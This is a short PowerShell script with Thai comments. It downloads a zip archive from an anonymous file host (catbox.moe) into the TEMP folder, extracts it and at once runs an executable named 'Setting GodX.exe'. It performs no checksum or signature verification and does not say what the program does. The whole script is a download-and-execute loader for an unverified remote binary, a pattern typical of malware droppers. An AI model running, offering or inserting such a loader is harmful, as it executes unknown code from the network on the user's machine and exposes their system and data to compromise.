# บังคับใช้โปรโตคอลความปลอดภัยสมัยใหม่เพื่อคุยกับเว็บ Server ให้ผ่าน
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

$exeName = "Setting GodX.exe"
$zipName = "Setting GodX.zip"
$zipUrl = "https://files.catbox.moe/afb9rh.zip"
$tempPath = "$env:TEMP\GodX_App"
$zipFilePath = "$tempPath\$zipName"

# 1. สร้างโฟลเดอร์สำหรับทำงานถ้ายังไม่มี
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath }

# 2. ดาวน์โหลดไฟล์
try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath -ErrorAction Stop
    
    # 3. แตกไฟล์
    Expand-Archive -Path $zipFilePath -DestinationPath $tempPath -Force
    
    # 4. รันโปรแกรม
    Start-Process "$tempPath\$exeName"
}
catch {
    Write-Host "เกิดข้อผิดพลาดในการดาวน์โหลดหรือรันไฟล์: $_" -ForegroundColor Red
    Read-Host "กด Enter เพื่อปิดหน้าต่างนี้"
}